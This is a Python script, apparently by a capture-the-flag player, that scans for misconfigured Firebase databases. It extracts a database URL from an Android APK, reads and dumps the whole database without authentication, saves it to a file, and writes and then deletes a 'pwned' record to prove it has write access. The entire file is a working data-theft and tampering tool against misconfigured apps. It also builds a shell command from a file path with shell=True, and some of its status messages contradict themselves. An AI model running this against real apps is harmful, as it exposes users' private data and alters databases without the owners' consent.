# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

from pyfiglet import Figlet
from termcolor import colored
from argparse import ArgumentParser, Namespace
import requests
from tabulate import tabulate
import pandas as pd
from subprocess import Popen, PIPE, STDOUT
import json
from pathlib import Path


def print_hi(header):
    f = Figlet(font="fuzzy", width=180)
    welcome = colored(f.renderText(text=header), "yellow")
    if readargs().verbose is not False:
        print(f"\n{welcome}")
    pass


def printincolor(word, color='white'):
    print(colored(word, color))
    pass


def validate_file(arg):
    if (file := Path(arg)).is_file():
        return file
    else:
        printincolor(f"[-] File {arg} not found", "red")
        exit(0)


def extractfirebaseurlfromapk():
    if readargs().apk is not None:
        cmd = f'strings {readargs().apk} | grep -iE "https://.*\.firebaseio\.com"'
        firebase = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT).communicate()[0]
        firebase = firebase.decode('utf-8').strip()
        if firebase == "":
            return None
        else:
            apkFirebaseURL = firebase.replace("$$", "")
            return apkFirebaseURL


def readargs() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="set the firebase url", metavar="URL", required=False)
    parser.add_argument("-o", "--output", dest="output", help="dump into filename ", required=False)
    parser.add_argument("-a", "--apk", dest="apk", help="enter the path of the APK file.", required=False, type=validate_file)
    parser.add_argument("-q", "--quiet", action="store_false", dest="verbose", default=True,
                        help="don't print status messages to stdout", required=False)
    arguments = parser.parse_args()
    # ArgumentParser
    return arguments
    pass


def writetofile(filename, dictdata):
    with open(filename, 'w') as file:
        json_object = json.dumps(dictdata, indent=2)
        file.write(json_object)
        file.close()
        printincolor(f"[+] JSON data written to {filename}.", "green")
    pass


def printtable(title, dictdata: dict):
    printincolor(f"[+] Dumping data of {colored(title, 'blue')}", "green")
    df = pd.DataFrame(dictdata)
    print(tabulate(df, headers='keys', tablefmt='pretty', showindex='always'))
    pass


def isreadabledatabase(firebaseURL: str) -> bool:  # it returns the firebase status code in true | false
    jsondomain = addjsontofirebaseurl(firebaseURL)
    response = requests.get(jsondomain)
    if 200 <= response.status_code <= 300:
        return True
    else:
        return False
    pass


def addjsontofirebaseurl(firebaseURL: str) -> str:
    domain = cleardomain(firebaseURL=firebaseURL)
    jsondomain = domain + '.json'
    return jsondomain


def getjsonoffirebase(firebaseURL: str):
    jsondomain = addjsontofirebaseurl(firebaseURL)
    jsondata = requests.get(jsondomain)
    return jsondata.json()


def extractdatabases(firebaseURL: str) -> [str]:
    status = isreadabledatabase(firebaseURL)
    if status:
        jsondata = getjsonoffirebase(firebaseURL)
        if readargs().output is not None:
            writetofile(readargs().output, jsondata)
        if type(jsondata) is dict:
            return list(jsondata.keys())
        pass
    return None


def addrecordtofirebase(firebaseURL: str):
    data = {"pwned": {"name": ["cTFk1ller"], "github": ["https://github.com/cTFk1ller"]}}
    jsondomain = addjsontofirebaseurl(firebaseURL)
    response = requests.post(jsondomain, json=data)
    if 200 <= response.status_code <= 300:
        databasename = response.json()['name']
        printtable(databasename, data['pwned'])
        printincolor(f"[*] about to remove added record", "blue")
        status = deleterecord(firebaseURL, databasename)
        if status:
            printincolor(f"[+] Record {colored(databasename, 'blue')} {colored('deleted successfully', 'green')}", 'green')
        else:
            printincolor(f"[-] Error Deleting Record {colored(databasename, 'blue')} {colored('From Database', 'red')}", 'red')
        return True
    else:
        return False


def deleterecord(firebaseURL, record) -> bool:
    record = record.replace('.', '/') + '/'
    domain = cleardomain(firebaseURL=firebaseURL) + record
    url = addjsontofirebaseurl(domain)
    response = requests.delete(url)
    if 200 <= response.status_code <= 300:
        return True
    return False


def cleardomain(firebaseURL: str):
    firebaseURL = firebaseURL.strip()
    url = firebaseURL if (firebaseURL[len(firebaseURL) - 1] == '/') else (firebaseURL + "/")
    return url
    pass


def start(firebaseURL: str):
    printincolor(f"[*] Start manipulating the Firebase domain at : {colored(firebaseURL, 'yellow')}", "blue")
    status = isreadabledatabase(firebaseURL)
    if status:
        printincolor("[+] Firebase URL read permission is not set.", "green")
        databases = extractdatabases(firebaseURL)
        if databases is None:
            printincolor("[-] No Databases Found", "red")
        else:
            printincolor(f"[+] Databases in the Firebase URL are: {', '.join(databases)}", "green")
        statusofwriting = addrecordtofirebase(firebaseURL)
        if statusofwriting:
            printincolor(f"[+] The Firebase URL has no permission to write. You can write to it.", "green")
        else:
            printincolor(f"[-] Firebase URL has permission to write to the database.", "red")
    else:
        printincolor("[-] Firebase URL read permission is set correctly.", "red")
    pass


if __name__ == '__main__':
    # Firebase Hacking
    args = readargs()
    print_hi("Firebase Apk Vulnerability Scanner Script")

    if args.url is not None:
        firebaseurl = cleardomain(args.url)
        start(firebaseurl)
    elif args.apk is not None:  # url extracted from the apk
        apkfirebaseurl = extractfirebaseurlfromapk()
        if apkfirebaseurl is None:  # apk contain a firebase url
            printincolor("[-] The Firebase URL does not exist in the apk.", "red")
        else:
            start(firebaseURL=apkfirebaseurl)
    else:
        printincolor("[*] Please select --url, --apk. At least one option is required.", 'blue')

    printincolor("[*] Done", "blue")
    printincolor("\nMr.CTFKi11er", "red")
    pass  # end of main check
